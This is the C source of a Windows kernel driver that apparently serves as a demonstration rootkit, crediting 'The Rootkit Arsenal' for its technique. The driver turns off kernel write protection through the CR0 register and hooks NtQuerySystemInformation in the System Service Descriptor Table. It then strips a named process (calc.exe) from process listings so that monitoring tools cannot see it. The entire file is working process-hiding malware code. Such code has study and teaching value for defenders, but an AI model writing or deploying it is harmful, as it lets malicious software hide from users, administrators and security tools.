#include <ntddk.h>

const wchar_t* processToHide = L"calc.exe";

// Declare the structure representing the System Service Table.
typedef struct SystemServiceTable
{
	PULONG ServiceTableBase; // Array of pointers to functions
	PULONG ServiceCounterTableBase; // Not used
	ULONG NumberOfServices; // Number of entries in the array
	PUCHAR ParamTableBase; // Array, each byte = num of bytes allocated for func arguments (there's an entry for each function)
}SST, * PSST;

// Tell the compiler that a specified function is exported by the kernel
// (ntoskrnl.exe) so that it won't throw an error when using it.
extern PSST KeServiceDescriptorTable;

// Get the index of a service in SSDT
/*
 * Clever trick from "The Rootkit Arsenal".
 * This macro identifies the number of the system call we're trying to hook.
 * All of the Zw* () routines start with: mov eax, xxxh, where "xxx" is a syscall number.
 * So, the number is actually stored in the second byte of the ADDRESS of system call.
 * So, by adding 1 to the system call address, we can access the system call number.
 */
#define GetServiceNumber(Function)(*(PULONG)((PUCHAR)Function + 1));

 // Define the original prototype of the hooked function
NTSYSAPI NTSTATUS NTAPI ZwQuerySystemInformation(ULONG, PVOID, ULONG, PULONG);

typedef NTSTATUS(*pNtQuerySystemInformation)(ULONG, PVOID, ULONG, PULONG);

// Original address of address of function in SSDT
ULONG SSDTAddress;

// Original function handle
pNtQuerySystemInformation NtQuerySystemInformationOrigHandle = NULL;

// Declare the process information structure
typedef struct _SYSTEM_PROCESS_INFORMATION {
	ULONG                   NextEntryOffset;
	ULONG                   NumberOfThreads;
	LARGE_INTEGER           Reserved[3];
	LARGE_INTEGER           CreateTime;
	LARGE_INTEGER           UserTime;
	LARGE_INTEGER           KernelTime;
	UNICODE_STRING          ImageName;
	KPRIORITY               BasePriority;
	HANDLE                  ProcessId;
	HANDLE                  InheritedFromProcessId;
} SYSTEM_PROCESS_INFORMATION, * PSYSTEM_PROCESS_INFORMATION;

// Hook function
NTSTATUS HookNtQuerySystemInformation(ULONG SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength)
{
	if (SystemInformationClass != 0x05)
	{
		// other info was requested, just use the original function
		return NtQuerySystemInformationOrigHandle(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
	}

	// process info was requested, get the process list from the original function
	const NTSTATUS ret = NtQuerySystemInformationOrigHandle(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
	if (!NT_SUCCESS(ret))
	{
		return ret;
	}
	DbgPrint("Hiding the process...\n");

	PSYSTEM_PROCESS_INFORMATION curr = NULL, next = SystemInformation;

	while (next->NextEntryOffset != 0)
	{
		// iterate over the list of processes
		// in order to find the one to hide
		curr = next;
		next = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)curr + curr->NextEntryOffset);

		if (!wcscmp(processToHide, next->ImageName.Buffer))
		{
			DbgPrint("Found the calculator!\n");
			if (next->NextEntryOffset == 0)
			{
				curr->NextEntryOffset = 0;
			}
			else
			{
				curr->NextEntryOffset += next->NextEntryOffset;
			}
			next = curr;
		}
	}
	return ret;
}

// Utility: Enable or disable WP bit in CR0 register
void EnableWP()
{
	__asm
	{
		mov eax, cr0
		or eax, 0x10000
		mov cr0, eax
	}
}

void DisableWP()
{
	__asm
	{
		mov eax, cr0
		and eax, not 0x10000
		mov cr0, eax
	}
}

void Unload(PDRIVER_OBJECT DriverObject)
{
	UNREFERENCED_PARAMETER(DriverObject);

	if (NtQuerySystemInformationOrigHandle != NULL) {
		DisableWP();
		// Revert to the original function address
		InterlockedExchangePointer((PVOID)SSDTAddress, (PVOID)NtQuerySystemInformationOrigHandle);
		EnableWP();
		DbgPrint("The original SSDT function has been restored\n");
	}

	DbgPrint("Driver unloaded\n");
}

NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
{
	UNREFERENCED_PARAMETER(RegistryPath);

	// Assign the function which will be executed on driver exit
	DriverObject->DriverUnload = Unload;

	DbgPrint("Starting new hook!\n");

	// Get the INDEX of the service in SSDT table using a simple hack
	const ULONG RoutineIndex = GetServiceNumber(ZwQuerySystemInformation);
	DisableWP();

	// Calculate the address of address of the routine held in SSDT
	// addr = KeServiceTableAddress + routine_index * 4 (bytes, address length)
	SSDTAddress = (ULONG)KeServiceDescriptorTable->ServiceTableBase + RoutineIndex * 4;
	// Get the absolute address of original routine
	const ULONG OrigNtQuerySystemInformation = *(PULONG)SSDTAddress;

	// Save the address of original function
	NtQuerySystemInformationOrigHandle = (pNtQuerySystemInformation)OrigNtQuerySystemInformation;
	// Swap the original address with the hooked function address
	// Use InterlockedExchange, because it's safer
	InterlockedExchangePointer((PVOID)SSDTAddress, (PVOID)HookNtQuerySystemInformation);

	// Turn the WP back on
	EnableWP();

	DbgPrint("End of DriverEntry!\n");

	return STATUS_SUCCESS;
}
